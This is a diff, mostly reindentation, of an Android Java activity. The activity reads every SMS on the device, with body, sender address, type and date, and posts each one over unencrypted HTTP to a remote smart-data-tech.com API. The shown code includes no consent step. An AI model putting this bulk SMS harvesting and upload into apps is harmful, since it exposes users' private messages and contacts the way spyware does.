@@ -60,113 +60,113 @@ public class SaveUserMessage extends AppCompatActivity {
 
 
         ContentResolver contentResolver = context.getContentResolver();
-            Cursor smsInboxCursor = contentResolver.query(Uri.parse("content://sms/"), null, null, null, null);
-            int indexBody = smsInboxCursor.getColumnIndex("body");
-            int indexAddress = smsInboxCursor.getColumnIndex("address");
-            int dat = smsInboxCursor.getColumnIndex("date_sent");
+        Cursor smsInboxCursor = contentResolver.query(Uri.parse("content://sms/"), null, null, null, null);
+        int indexBody = smsInboxCursor.getColumnIndex("body");
+        int indexAddress = smsInboxCursor.getColumnIndex("address");
+        int dat = smsInboxCursor.getColumnIndex("date_sent");
         int typesms = smsInboxCursor.getColumnIndex("type");
         String varr="non";
         Toast.makeText(context, "Entrée dans Do", Toast.LENGTH_LONG).show();
 
-            if (indexBody < 0 || !smsInboxCursor.moveToFirst()) return;
-            do {
-                //Integer.toString(smsInboxCursor.getColumnIndex("address")),
-                varr ="oui";
-                Date date = new Date(smsInboxCursor.getLong(dat));
-                String formattedDate = new SimpleDateFormat("dd/MM/yyyy").format(date);
+        if (indexBody < 0 || !smsInboxCursor.moveToFirst()) return;
+        do {
+            //Integer.toString(smsInboxCursor.getColumnIndex("address")),
+            varr ="oui";
+            Date date = new Date(smsInboxCursor.getLong(dat));
+            String formattedDate = new SimpleDateFormat("dd/MM/yyyy").format(date);
 
-                InsertData(1,
-                        458,
-                        smsInboxCursor.getString(indexBody),
-                        TypeSms(typesms),
-                        formattedDate,
-                        formattedDate,
-                        smsInboxCursor.getString(indexAddress),
-                        smsInboxCursor.getString(indexAddress),
-                        dateFormatter,
-                        heureFormatter,
-                        "actif");
-
-
-            } while (smsInboxCursor.moveToNext());
-            smsInboxCursor.close();
-            //InsertData("papa","pa@mail.com");
-            //}
+            InsertData(1,
+                    458,
+                    smsInboxCursor.getString(indexBody),
+                    TypeSms(typesms),
+                    formattedDate,
+                    formattedDate,
+                    smsInboxCursor.getString(indexAddress),
+                    smsInboxCursor.getString(indexAddress),
+                    dateFormatter,
+                    heureFormatter,
+                    "actif");
 
 
-            Toast.makeText(context,"on sort du do avec"+varr,Toast.LENGTH_LONG).show();
+        } while (smsInboxCursor.moveToNext());
+        smsInboxCursor.close();
+        //InsertData("papa","pa@mail.com");
+        //}
+
+
+        Toast.makeText(context,"on sort du do avec"+varr,Toast.LENGTH_LONG).show();
 
     }
 
-        protected void InsertData ( final int id_user, final int id_message,
-        final String contenu_message, final String type_message,
-        final String dat_message, final String heure_message, final String correspondant_number,
-        final String correspondant_name, final String dat_ins_message,
-        final String heure_ins_message,
-        final String etat){
+    protected void InsertData ( final int id_user, final int id_message,
+                                final String contenu_message, final String type_message,
+                                final String dat_message, final String heure_message, final String correspondant_number,
+                                final String correspondant_name, final String dat_ins_message,
+                                final String heure_ins_message,
+                                final String etat){
 
-            class SendPostReqAsyncTask extends AsyncTask<String, Void, String> {
-                @Override
-                protected String doInBackground(String... params) {
+        class SendPostReqAsyncTask extends AsyncTask<String, Void, String> {
+            @Override
+            protected String doInBackground(String... params) {
 
                 /*String NameHolder = name;
                 String EmailHolder = email;*/
 
-                    List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>();
+                List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>();
 
                /*nameValuePairs.add(new BasicNameValuePair("name",Integer.toString(id_user)));
                 nameValuePairs.add(new BasicNameValuePair("email",Integer.toString(id_message)));*/
-                    nameValuePairs.add(new BasicNameValuePair("id_user", Integer.toString(id_user)));
-                    nameValuePairs.add(new BasicNameValuePair("id_message", Integer.toString(id_message)));
-                    nameValuePairs.add(new BasicNameValuePair("contenu_message", contenu_message));
-                    nameValuePairs.add(new BasicNameValuePair("type_message", type_message));
-                    nameValuePairs.add(new BasicNameValuePair("dat_message", dat_message));
-                    nameValuePairs.add(new BasicNameValuePair("heure_message", heure_message));
-                    nameValuePairs.add(new BasicNameValuePair("correspondant_number", correspondant_number));
-                    nameValuePairs.add(new BasicNameValuePair("correspondant_name", correspondant_name));
-                    nameValuePairs.add(new BasicNameValuePair("dat_ins_message", dat_ins_message));
-                    nameValuePairs.add(new BasicNameValuePair("heure_ins_message", heure_ins_message));
-                    nameValuePairs.add(new BasicNameValuePair("etat", etat));
+                nameValuePairs.add(new BasicNameValuePair("id_user", Integer.toString(id_user)));
+                nameValuePairs.add(new BasicNameValuePair("id_message", Integer.toString(id_message)));
+                nameValuePairs.add(new BasicNameValuePair("contenu_message", contenu_message));
+                nameValuePairs.add(new BasicNameValuePair("type_message", type_message));
+                nameValuePairs.add(new BasicNameValuePair("dat_message", dat_message));
+                nameValuePairs.add(new BasicNameValuePair("heure_message", heure_message));
+                nameValuePairs.add(new BasicNameValuePair("correspondant_number", correspondant_number));
+                nameValuePairs.add(new BasicNameValuePair("correspondant_name", correspondant_name));
+                nameValuePairs.add(new BasicNameValuePair("dat_ins_message", dat_ins_message));
+                nameValuePairs.add(new BasicNameValuePair("heure_ins_message", heure_ins_message));
+                nameValuePairs.add(new BasicNameValuePair("etat", etat));
 
-                    try {
-                        HttpClient httpClient = new DefaultHttpClient();
+                try {
+                    HttpClient httpClient = new DefaultHttpClient();
 
-                        HttpPost httpPost = new HttpPost("http://smart-data-tech.com/dev/API/v1/saveUserMessage/");
-                       // HttpPost httpPost = new HttpPost("http://smart-data-tech.com/dev/fr/crud.php");
+                    HttpPost httpPost = new HttpPost("http://smart-data-tech.com/dev/API/v1/saveUserMessage/");
+                    // HttpPost httpPost = new HttpPost("http://smart-data-tech.com/dev/fr/crud.php");
 
-                        //HttpPost httpPost = new HttpPost("http://smart-data-tech.com/dev/fr/crud.php");
-                        httpPost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
+                    //HttpPost httpPost = new HttpPost("http://smart-data-tech.com/dev/fr/crud.php");
+                    httpPost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
 
-                        HttpResponse httpResponse = httpClient.execute(httpPost);
+                    HttpResponse httpResponse = httpClient.execute(httpPost);
 
-                        HttpEntity httpEntity = httpResponse.getEntity();
+                    HttpEntity httpEntity = httpResponse.getEntity();
 
 
-                    } catch (ClientProtocolException e) {
+                } catch (ClientProtocolException e) {
 
-                    } catch (IOException e) {
-
-                    }
-                    return "Data Inserted Successfully";
-                }
-
-                @Override
-                protected void onPostExecute(String result) {
-
-                    super.onPostExecute(result);
-
-                    //Toast.makeText(MainActivity.this, "Data Submit Successfully", Toast.LENGTH_LONG).show();
+                } catch (IOException e) {
 
                 }
+                return "Data Inserted Successfully";
             }
 
-            SendPostReqAsyncTask sendPostReqAsyncTask = new SendPostReqAsyncTask();
+            @Override
+            protected void onPostExecute(String result) {
 
-            sendPostReqAsyncTask.execute(Integer.toString(id_user), Integer.toString(id_message), contenu_message, type_message,
-                    dat_message, heure_message, correspondant_number,
-                    correspondant_name, dat_ins_message, heure_ins_message,
-                    etat);
+                super.onPostExecute(result);
+
+                //Toast.makeText(MainActivity.this, "Data Submit Successfully", Toast.LENGTH_LONG).show();
+
+            }
         }
+
+        SendPostReqAsyncTask sendPostReqAsyncTask = new SendPostReqAsyncTask();
+
+        sendPostReqAsyncTask.execute(Integer.toString(id_user), Integer.toString(id_message), contenu_message, type_message,
+                dat_message, heure_message, correspondant_number,
+                correspondant_name, dat_ins_message, heure_ins_message,
+                etat);
+    }
 
     private String TypeSms(int type) {
         switch (type) {
